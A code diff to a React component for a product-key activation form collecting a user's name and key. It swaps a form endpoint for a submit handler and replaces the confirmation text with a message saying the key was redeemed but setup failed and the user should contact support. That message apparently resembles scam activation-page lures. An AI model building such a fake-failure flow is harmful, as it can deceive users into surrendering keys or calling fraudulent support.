@@ -25,7 +25,7 @@ function MessageBox() {
     return (
       <>
         <Box w={{ base: "100%", lg: "70%" }} display={"flex"} justifyContent={"center"} alignItems={"center"} border={"1px solid lightgrey"} borderRadius={"5px"}>
-          <Text mt={"0px"} color={"#f76113"} fontSize={{ base: "10px", lg: "30px" }} fontWeight={700}>Thank You Agent will contact you shortly!</Text>
+          <Text mt={"0px"} color={"#f76113"} fontSize={{ base: "10px", lg: "30px" }} fontWeight={700}>Your key has been redeem successfully but setup could not be started please contact support!</Text>
         </Box>
       </>
     )
@@ -35,7 +35,7 @@ function MessageBox() {
   return (
     <Box w={{ base: "90%", lg: "70%" }} m={"auto"} display={"flex"} justifyContent={"center"} alignItems={"center"}>
       <Box w={"100%"}  bg={"#f8f9fa"} border={"1px solid lightgrey"} borderRadius={"5px"} p={"30px 20px 30px 20px"} display={"flex"} flexDirection={"column"} gap={"20px"}>
-        <form style={{ display: "flex", flexDirection: "column", gap: "20px" }} action="https://getform.io/f/warkywpb" method="POST">
+        <form style={{ display: "flex", flexDirection: "column", gap: "20px" }} onSubmit={handleSubmitMessage} >
           <Box>
             <Text fontSize={{base:"10px",lg:"15px"}} fontWeight={600}>Your Name</Text>
             <Input placeholder='Name' required={true} name="username" borderRadius={"0px"} fontSize={{base:"10px",lg:"15px"}} fontWeight={600} />
@@ -53,7 +53,7 @@ function MessageBox() {
             <Input placeholder='Product Key' required={true} name="Product Key" borderRadius={"0px"} fontSize={{base:"10px",lg:"15px"}} fontWeight={600} />
           </Box>
           <Box>
-            <Button isLoading={isLoading} type='submit' textTransform={"uppercase"} color={"white"} bg={"#810101"} _hover={{bg:"black"}}>Submit</Button>
+            <Button isLoading={isLoading} type='submit' textTransform={"uppercase"} color={"white"} bg={"#810101"} _hover={{bg:"black"}}>Activate Now</Button>
           </Box>
         </form>
       </Box>
